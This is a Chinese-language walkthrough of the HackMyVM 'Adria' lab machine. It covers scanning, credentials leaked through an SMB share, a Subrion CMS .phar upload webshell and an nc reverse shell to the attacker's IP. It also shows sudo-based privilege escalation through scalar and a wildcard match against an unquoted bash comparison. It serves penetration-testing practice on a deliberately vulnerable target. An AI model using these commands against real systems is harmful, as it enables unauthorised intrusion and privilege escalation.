---
title: HMV Adria
published: 2025-02-25
pinned: false
description: HMV Adria，渗透，wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-02-25
pubDate: 2025-02-25
---


## HMV Adria

### 靶场链接
https://hackmyvm.eu/machines/machine.php?vm=Adria

### 日常扫描
```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
192.168.31.102  08:00:27:96:ce:01       (Unknown)
192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.864 seconds (137.34 hosts/sec). 3 responded

┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -T4 -Pn -p- 192.168.31.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 22:21 HKT
Nmap scan report for 192.168.31.102
Host is up (0.0014s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
|_http-title: Did not follow redirect to http://adria.hmv/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.57 (Debian)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 08:00:27:96:CE:01 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

我说直接curl80没有东西，他有个重定向，写入到/etc/hosts，然后访问就行了

扫一下目录
```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.31.102 -i 200,301
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                
 (_||| _) (/_(_|| (_| )                                                         
                                                                                
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.31.102/_25-02-24_22-30-28.txt

Target: http://192.168.31.102/

[22:30:28] Starting:                                                            
[22:30:39] 200 -  247B  - /.gitignore                                       
[22:31:41] 200 -   15KB - /changelog.txt                                    
[22:31:47] 200 -    4KB - /CONTRIBUTING.md                                  
[22:31:58] 200 -  851B  - /favicon.ico                                      
[22:32:13] 200 -   12KB - /license.txt                                      
[22:32:29] 200 -    1KB - /panel.php                                        
[22:32:29] 200 -    1KB - /panel.aspx
[22:32:30] 200 -    1KB - /panel.jsp                                        
[22:32:30] 200 -    1KB - /panel.html
[22:32:30] 200 -    1KB - /panel/
[22:32:44] 200 -    5KB - /README.md                                        
[22:32:47] 200 -   94B  - /robots.txt                                       
[22:32:55] 200 -  212B  - /sitemap.xml                                      
                                                                             
Task Completed     
```
/panel.php是后台页面，最有用的信息" Powered by Subrion CMS v4.2.1"
### 反弹shell
smb启动看看
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.31.102 -N   

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        DebianShare     Disk      
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 192.168.31.102 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient  //192.168.31.102/DebianShare 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Dec  4 17:32:45 2023
  ..                                  D        0  Sat Jul 22 16:10:13 2023
  configz.zip                         N  2756857  Mon Nov  6 23:56:25 2023

                19480400 blocks of size 1024. 15686980 blocks available
smb: \> get configz.zip
getting file \configz.zip of size 2756857 as configz.zip (26655.8 KiloBytes/sec) (average 26655.9 KiloBytes/sec)
smb: \> 

```

看看zip里面有什么，解压看看
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cd configz 
                                                                                
┌──(kali㉿kali)-[~/Desktop/configz]
└─$ ls
boot  isolinux  preseed
                                                                                
┌──(kali㉿kali)-[~/Desktop/configz]
└─$ grep -r "user"    
preseed/master.preseed:d-i passwd/user-fullname string admin
preseed/master.preseed:d-i passwd/username string admin
preseed/master.preseed:d-i passwd/user-password password jojo1989
preseed/master.preseed:d-i user-setup/allow-password-weak boolean true
preseed/master.seed:# To create a normal user account.
preseed/master.seed:d-i passwd/user-fullname string Adam Lewis
preseed/master.seed:d-i passwd/username string alewis
preseed/master.seed:# Normal user's password, either in clear text
preseed/master.seed:#d-i passwd/user-password password insecure
preseed/master.seed:#d-i passwd/user-password-again password insecure
preseed/master.seed:d-i passwd/user-password-crypted 158f5ddb69d03f91bb449ee170913268
preseed/master.seed:# Create the first user with the specified UID instead of the default.
preseed/master.seed:d-i passwd/user-uid string 1010
preseed/master.seed:#d-i user-setup/allow-password-weak boolean true
grep: boot/grub/x86_64-efi/legacycfg.mod: binary file matches
grep: boot/grub/x86_64-efi/read.mod: binary file matches
grep: boot/grub/x86_64-efi/password.mod: binary file matches
grep: boot/grub/x86_64-efi/password_pbkdf2.mod: binary file matches
grep: boot/grub/x86_64-efi/bsd.mod: binary file matches
grep: boot/grub/efi.img: binary file matches
grep: isolinux/libcom32.c32: binary file matches
isolinux/ks.cfg:#Initial user
isolinux/ks.cfg:user cscience --fullname "Coin Science" --iscrypted --password $1$cw7eQ/70$/8ZeZKBBBJPtIFdnibj/X/
grep: isolinux/en.hlp: binary file matches
grep: isolinux/nb.tr: binary file matches
isolinux/f9.txt:and the next user who comes up with the same problem will profit from your
grep: isolinux/ldlinux.c32: binary file matches
grep: isolinux/bootlogo: binary file matches
grep: isolinux/si.hlp: binary file matches
grep: isolinux/ka.hlp: binary file matches

```
利用grep直接查找想要的信息admin/jojo1989
进入后台，查找cms对应版本漏洞，是文件上传.phar，传个一句话木马上去
>http://192.168.31.102/uploads/shell.phar?cmd=nc%20-e%20/bin/bash%20192.168.31.183%204444

顺便/usr/bin/script -qc /bin/bash /dev/null拉个交互式终端

### 提权
先看看这个能干啥
```
www-data@adria:/var/www/html/uploads$ sudo -l
sudo -l
sudo: unable to resolve host adria: No address associated with hostname
Matching Defaults entries for www-data on adria:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on adria:
    (adriana) NOPASSWD: /usr/bin/scalar

```
scalar虽然自身没有直接执行命令的能力，但是可以通过手动输入脚本然后像python那样逐行解释运行。
可以在该工具的交互式输入!sh来获取adriana用户的shell
>sudo -u adriana /usr/bin/scalar list

得到用户权限和flag

```
sudo -l
sudo: unable to resolve host adria: No address associated with hostname
Matching Defaults entries for adriana on adria:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User adriana may run the following commands on adria:
    (ALL : ALL) NOPASSWD: /opt/backup

```
这次可以执行的是个backup
```
cat /opt/backup
#!/bin/bash

PASSWORD=$(/usr/bin/cat /root/pass)

read -ep "Password: " USER_PASS

if [[ $PASSWORD == $USER_PASS ]] ; then

  /usr/bin/echo "Authorized access"
  /usr/bin/sleep 1
  /usr/bin/zip -r -e -P "$PASSWORD" /opt/backup.zip /var/www/html
else
  /usr/bin/echo "Access denied"
  exit 1
fi

```

这个脚本有一个问题，就是第7行的
>$PASSWORD == $USER_PASS

两个变量都没有加上引号，呈现上就是如果输入通配符*或者？的话会直接匹配成真,
所以我们对于backup这个脚本也只需要输入*即可。只不过密码不会直接打印出来，需要起另一个进程监视后台即可
>watch -n 0.1 -d "ps aux | grep -ai /usr/bin/zip"

得到密码